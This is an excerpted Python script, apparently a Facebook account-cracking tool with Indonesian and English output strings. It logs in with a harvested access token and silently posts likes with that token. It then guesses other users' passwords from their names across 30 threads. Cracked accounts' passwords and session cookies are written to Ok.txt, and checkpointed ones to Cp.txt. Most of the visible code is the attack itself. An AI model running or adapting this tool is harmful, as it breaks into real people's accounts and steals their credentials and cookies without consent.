...
try:
	user = ('Mozilla/5.0 (Linux; Android 11; V2043_21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36;]')
...
class login:
	...
	def __login__(self):
		...
		if token in ['']:
			...
			try:
				...
				print('\n [%s+%s] Login successful %s'%(H,N,cc))
				self.bot()
			except KeyError:
				jalan(' [%s!%s] Token error, try to change the sacrificial account!'%(M,N))
				self.takon()
	def takon(self):
		takon = input('\n %s[%s!%s] Want to know how to get tokens y/t: '%(N,O,N))
		if takon in ['y','Y','iya']:
			jalan('\n %s[%s!%s] You will be directed to Wa for Donation'%(N,O,N))
	...
	def bot(self):
		...
		try:
			...
			jalan('\n [%s!%s] Mokad token change account!'%(M,N));time.sleep(1);login().__login__()
		...
		requests.post('https://graph.facebook.com/885191859545960/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/885191859545960/likes?summary=true&access_token=' + toket)
		jalan('\n\tFollow Facebook I used to be Anj  ^_^')
...
class menu:
	...
	def main(self):
		...
		try:
			...
			print(' [%s+%s] You are not logged in'%(M,N));login().__login__()
		try:
		...
		print(' %s[%s•%s] IP Address      : %s'%(N,O,N,IP))
		print(' %s[%s•%s] Login Date        : %s'%(N,O,N,waktu))
		print(' %s'%(N))
		mn()
...
class crack:
				...
				if pw in ['']:
					...
					def manual(xnxx=None):
						...
						if mani in ['']:
							...
							print(' %s '%(N))
							print(' %s [%s*%s] OK account will be saved in file : Ok.txt'%(N,O,N))
							print(' %s [%s*%s] CP account will be saved in file : Cp.txt\n'%(N,O,N))
							with khamdihiXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
	...
	def free(self):
		print(' %s '%(N))
		print(' %s [%s*%s] OK account will be saved in file  : hasil/Ok.txt'%(N,O,N))
		print(' %s [%s*%s] OK account will be saved in file : hasil/Cp.txt\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
					...
					nun = sempak[0]
					if len(nun)>=6:
						pwx = [nun, nun+'123', nun+'1234', nun+'12', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123', nun+'1234', nun+'12', name]
					elif len(nun)<=5:
						pwx = [nun, nun+'123', nun+'1234', nun+'12', name]
	...
	def basic(self):
		print(' %s '%(N))
		print(' %s [%s*%s] OK account will be saved in file : Ok.txt'%(N,O,N))
		print(' %s [%s*%s] CP account will be saved in file: Cp.txt'%(N,O,N))
			...
			for pw in pwx:
				...
				if "c_user" in ses.cookies.get_dict():
					try:
						...
						print('\r %sSuccessful😁◨ %s • %s • %'%(H,user,pw,coki))
						cek_apk(coki)
					...
					try:
						...
						month = bulan12[month]
						print('\r %sCheckpoint😕◧ %s • %s '%(K,user,pw))
						cp.append("%s • %s"%(user,pw,))
						open('Cp.txt', 'a').write("Checkpoint😕◧ %s • %s \n"%(user,pw))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
		...
		for pw in pwx:
			try:
				...
				if "checkpoint" in po.cookies.get_dict().keys():
					print('\r %sCheckpoint😕◧ %s • %s\n'%(K,user,pw))
					cp.append("%s | %s "%(user, pw))
					open("cp.txt","a").write("%s|%s \n"%(user, pw))
					open("checkcp.txt","a").write("Checkpoint😕◧ %s|%s \n"%(user, pw))
					break
				elif "c_user" in ses.cookies.get_dict().keys():
					coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\r %sSuccessful😁◨ %s • %s                 %s'%(H,user,pw,N))
					cek_apk(coki)
					ok.append("%s|%s|%s"%(user, pw, coki))
					open("ok.txt","a").write("Successful😁◨ %s|%s|%s\n"%(user, pw, coki))
					break
	...
	def mbasic(self,user,pwx):
		...
		sys.stdout.write('\r %s••• %s[%s 😘CHARSI %s] %s/%s [ OK:%s ] <-> [ CP:%s ] %s••• '%(asw,N,H,N,loop,len(self.id),len(ok),len(cp),mmk));sys.stdout.flush()
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
				...
				if 'c_user' in ses.cookies.get_dict():
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %sSuccessful😁◨ %s • %s • %s %s %s • %s'%(H,user,pw,day,month,year,coki))
						cek_apk(coki)
					...
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %sCheckpoint😕◧ %s • %s • %s %s %s '%(K,user,pw,day,month,year))
						cp.append("%s • %s • %s %s %s"%(user,pw,day,month,year))
						open('Cp.txt', 'a').write("Checkpoint😕◧ %s • %s • %s %s %s \n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
